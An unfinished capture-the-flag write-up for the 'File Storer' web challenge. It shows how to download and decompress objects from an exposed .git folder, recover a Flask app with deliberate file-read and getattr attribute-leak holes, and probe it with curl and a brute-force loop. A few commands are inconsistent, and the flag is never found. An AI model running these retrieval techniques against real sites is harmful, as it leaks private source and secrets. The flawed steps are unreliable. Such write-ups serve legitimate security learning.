# File Storer
web - 160 points

## Challenge 
My friend made a file storage website that he says is super secure. Can you prove him wrong and get the admin password?

## Hint
Can't solve it? Git gud.


## Solution

From the hint, they use Git. 

Understanding the `.git` folder:
- https://git-scm.com/book/id/v2/Git-Internals-Git-Objects
- https://githowto.com/git_internals_git_directory

Let's access the `.git` folder
	
	http://web2.angstromctf.com:8899/files/.git/
	
	[Errno 21] Is a directory: u'.git/'

Woot, we can try to see the commits

	http://web2.angstromctf.com:8899/files/.git/logs/HEAD
	
	0000000000000000000000000000000000000000 1233bdadb67c905af6516a2e1b94ebf32a0a2f61 kmh11 1504055389 -0400	commit (initial): first commit

And the index binary

	http://web2.angstromctf.com:8899/files/.git/index
	
	DIRCY��$Y_dY��w��A����� g���%�U��T�X2����index.pyY��$�oYrI�)��`A������ᄅ� ��,?����8���requirements.txtY�z��Y���B A������C1�s1F��*0vĊ�l�templates/index.htmlY�z �pY� $ �A������)����K	���=��m"�templates/loggedout.htmlTREE;4 1 U(˄�9	�	h�+4�b8�templates2 0 c�)2 ���ߩ��M�ѧN`��~�o�Q5K��w&|

We can parse the index using a tool: https://gist.github.com/sriranggd/1144775

	 :id=>"aa168eed25aa55fff21054a858329cb4e1187ff0",
	 :flags=>{:name_length=>8, :stage=>0},
	 :name=>"index.py"}

We see that there is an `index.py`. However, it is blocked if we visit http://web2.angstromctf.com:8899/files/index.py and shows us 
	
	no! bad user! bad!

The git ID above is `aa168eed25aa55fff21054a858329cb4e1187ff0`...
Hence it is located at
	
	http://web2.angstromctf.com:8899/files/.git/objects/12/aa168eed25aa55fff21054a858329cb4e1187ff0

-----

Alternatively, we can `git init` and copy in the index

	test $ git ls-files --stage
	100644 aa168eed25aa55fff21054a858329cb4e1187ff0 0	index.py
	100644 b8e1848501840d89d32c3f8eadfafe38a78f8203 0	requirements.txt
	100644 4331a907733114461f8ce52a3076c48ac26c00c2 0	templates/index.html
	100644 29fff8b2c54b09cf0318dde83d1bcbdc1d6d22e8 0	templates/loggedout.html

This means that we can find index.py at http://web2.angstromctf.com:8899/files/.git/objects/aa/168eed25aa55fff21054a858329cb4e1187ff0

Download and decompress

	$ wget http://web2.angstromctf.com:8899/files/.git/objects/aa/168eed25aa55fff21054a858329cb4e1187ff0
	$ pigz -d < 168eed25aa55fff21054a858329cb4e1187ff0 

	blob 2663from flask import Flask, request, render_template, abort
	import os, requests

	app = Flask(__name__)

	class user:
	    def __init__(self, username, password):
	        self.username = username
	        self.__password = password
	        self.files = []
	    def getPass(self):
	        return self.__password

	users = {}

	users["admin"] = user("admin", os.environ["FLAG"])

	@app.errorhandler(500)
	def custom500(error):
	    return str(error), 500

	@app.route("/", methods=["GET", "POST"])
	def mainpage():
	    if request.method == "POST":
	        if request.form["action"] == "Login":
	            if request.form["username"] in users:
	                if request.form["password"] == users[request.form["username"]].getPass():
	                    return render_template("index.html", user=users[request.form["username"]])
	                return "wrong password"
	            return "user does not exist"
	        elif request.form["action"] == "Signup":
	            if request.form["username"] not in users:
	                users[request.form["username"]] = user(request.form["username"], request.form["password"])
	                return render_template("index.html", user=users[request.form["username"]])
	            else:
	                return "user already exists"
	        elif request.form["action"] == "Add File":
	            return addfile()
	    return render_template("loggedout.html")

	#beta feature for viewing info about other users - still testing
	@app.route("/user/<username>", methods=['POST'])
	def getInfo(username):
	    val = getattr(users[username], request.form['field'], None)
	    if val != None: return val
	    else: return "error"

	@app.route("/files/<path:file>", methods=["GET"])
	def getFile(file):
	    if "index.py" in file:
	        return "no! bad user! bad!"
	    return open(file, "rb").read()

	def addfile():
	    if users[request.form["username"]].getPass() == request.form["password"]:
	        if request.form['url'][-1] == "/": downloadurl = request.form['url'][:-1]
	        else: downloadurl = request.form['url']
	        if downloadurl.split("/")[-1] in os.listdir("."):
	            return "file already exists"
	        file = requests.get(downloadurl, stream=True)
	        f = open(downloadurl.split("/")[-1], "wb")
	        first = True
	        for chunk in file.iter_content(chunk_size=1024*512):
	            if not first: break
	            f.write(chunk)
	            first = False
	        f.close()
	        users[request.form["username"]].files.append(downloadurl.split("/")[-1])
	        return render_template("index.html", user=users[request.form["username"]])
	    return "bad password"

	if __name__ == "__main__": app.run(host="0.0.0.0")

Seeing the source code, we find this to get our flag

	@app.route("/user/<username>", methods=['POST'])
	def getInfo(username):
	    val = getattr(users[username], request.form['field'], None)
	    if val != None: return val
	    else: return "error"
	$ curl --data 'field=username' --url "http://web2.angstromctf.com:8899/user/admin"
	admin

Unfortunately, it seems the sourcecode is not the one live on the site...

	$ curl --data 'field=__password' --url "http://web2.angstromctf.com:8899/user/admin"
	error

	$ curl --data 'field=password' --url "http://web2.angstromctf.com:8899/user/admin"
	error

	$ curl --data 'field=__init__' --url "http://web2.angstromctf.com:8899/user/admin"
	no you can't do that that could break it sorry this isn't in the code you have 

---

### ???
IDK how to solve from here onwards...


logs/HEAD and the hash of the commit:

	$ wget http://web2.angstromctf.com:8899/files/.git/objects/12/33bdadb67c905af6516a2e1b94ebf32a0a2f61
	$ pigz -d < 168eed25aa55fff21054a858329cb4e1187ff0 

	commit 670tree 5528cb84ba39060910e309688e2b340084623899
	author kmh11 <hoppykev@gmail.com> 1504055389 -0400
	committer kmh11 <hoppykev@gmail.com> 1504055389 -0400
	gpgsig -----BEGIN PGP SIGNATURE-----
	 
	 iQEzBAABCAAdFiEEUl/3JcBbXSJ5n6GdRm6z8F9MFk0FAlmmEF0ACgkQRm6z8F9M
	 Fk1y/Af5AYPkyfTTUVfOo8RYdbxC2+Ub42WaCA3sPcIHlln9/kct/X/CSBHH4Tvf
	 cXkvkh+eX1zJn6+O5uKBmRkfPGU5UznVRjOAEZTaflyEgsjIai13/iAvxDGqoY/p
	 KrgGCBVNI6IjsrFEwvLtP/6YVio8v/jHui8GvyOtJzVUkIRywQjn6tpdEuP8OeXd
	 3D6wUayLhRcWBMGGUzIIR/ctFGEIUV4TAs4W4mdQZU8CGN1YFGNNSrRi+TbALYKE
	 cvHSh9nt7u2a6dZO0SbqJyAQcqnRgu+8cHp3USR3j+SL8M0So7c8MgSw96PMjJdg
	 itxQVF84HElygXa0PqfwLHnX+XkwRQ==
	 =RZjV
	 -----END PGP SIGNATURE-----

	first commit

creator's PGP signature

	# 5528cb84ba39060910e309688e2b340084623899
	wget http://web2.angstromctf.com:8899/files/.git/objects/55/28cb84ba39060910e309688e2b340084623899
	pigz -d < 28cb84ba39060910e309688e2b340084623899 

bruteforce folders in bash script

	for i in {0..255}; do
		hex=$(printf '%02x' $i);
		output=$(curl -s "http://web2.angstromctf.com:8899/files/.git/objects/$hex/168eed25aa55fff21054a858329cb4e1187ff0")
		echo $hex $output;
	done


## Flag

	??
